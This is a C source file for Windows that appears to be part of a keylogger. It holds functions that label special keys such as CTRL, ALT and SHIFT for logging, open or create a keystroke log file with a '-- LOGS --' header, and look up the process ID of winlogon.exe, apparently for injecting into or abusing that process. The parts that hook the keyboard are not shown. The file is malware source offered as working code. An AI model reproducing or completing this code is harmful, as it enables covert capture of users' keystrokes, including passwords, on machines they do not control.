#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

char* handleSpecialCase(DWORD vkCode)
{
    switch (vkCode)
    {
        case VK_ESCAPE:
            return "[ESC]";
        case VK_RETURN:
            return "[RETURN]";
        case VK_TAB:
            return "[TAB]";
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:
            return "[CTRL]";
        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU:
            return "[ALT]";
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:
            return "[SHIFT]";
        case VK_CAPITAL:
            return "[CAPS_LOCK]";
        case VK_BACK:
            return "[BACK]";
    }
    return NULL;
}

int getFolderStringLength (TCHAR* str)
{
    int lastBackslashPos = 0;
    for (int i = 0; i < strlen(str); i++)
    {
        if (str[i] == '\\')
        {
            lastBackslashPos = i;
        }
    }
    return lastBackslashPos;
}

HANDLE openOrCreateFile(char* filename)
{
	HANDLE hFile;
    // Try to create file
    hFile = CreateFile(filename,      
                       GENERIC_WRITE,        
                       0,                   
                       NULL,               
                       CREATE_NEW,        
                       FILE_ATTRIBUTE_NORMAL,
                       NULL);
    // If creation failed try to edit it
    if (hFile == INVALID_HANDLE_VALUE) 
    { 
        hFile = CreateFile(filename,
                           FILE_APPEND_DATA,
                           0,              
                           NULL,          
                           OPEN_EXISTING,
                           FILE_ATTRIBUTE_NORMAL,
                           NULL);
        if (hFile == INVALID_HANDLE_VALUE)
        {
            printf("[Terminal failure: Unable to creat or open file.\n]");
        }
    }
    else
    {
        char header[] = "-- LOGS --";
        DWORD dwBytesWritten;
        WriteFile( 
            hFile,
            header,
            strlen(header),
            &dwBytesWritten,
            NULL);
    }
    return hFile;
}

DWORD getWinlogonPID()
{
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, "winlogon.exe") == 0)
            {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        }
    }

    CloseHandle(snapshot);
    return -1;
}
